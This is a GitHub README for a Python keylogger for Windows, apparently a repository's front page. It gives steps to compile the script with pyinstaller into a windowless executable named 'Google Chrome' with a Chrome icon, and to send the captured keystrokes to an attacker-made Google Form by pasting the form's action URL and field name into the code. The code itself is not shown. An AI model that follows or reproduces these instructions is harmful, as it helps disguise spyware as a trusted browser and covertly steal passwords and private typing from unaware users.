# A.K-Python-KeyLogger
A.K Python KeyLogger is a python based keylogger and linked with Google Chrome for windows based operating system.
Use [pyinstaller](https://github.com/pyinstaller/pyinstaller/releases/download/v3.2.1/PyInstaller-3.2.1.zip) to convert .py file with dependencies to single .exe file:-
```bash
  pyinstaller --onefile --noconsole --ico=chrome.ico "Google Chrome.py"
```
  
Note you can use this [icon](http://www.iconarchive.com/download/i95295/dtafalonso/android-l/Chrome.ico).

**Requirements:**
- [Python 2.7](https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi)
- [pyHook](https://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/pyHook-1.5.1.win32-py2.7.exe/download)
- [pythoncom](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.7.exe/download)

Create a [Google Form](https://docs.google.com/forms/) like this:
![Google Forms](https://github.com/atultherajput/A.K-Python-KeyLogger/raw/master/images/form.png)

And then open source code of your form like this:
![Source Code](https://github.com/atultherajput/A.K-Python-KeyLogger/raw/master/images/source_code.jpg)

And from there retrieve from *form action value='xxxx'* and *text name value='xxxx'* as shown in image. And then paste it under remote() method's *url* and *klog* variables. 
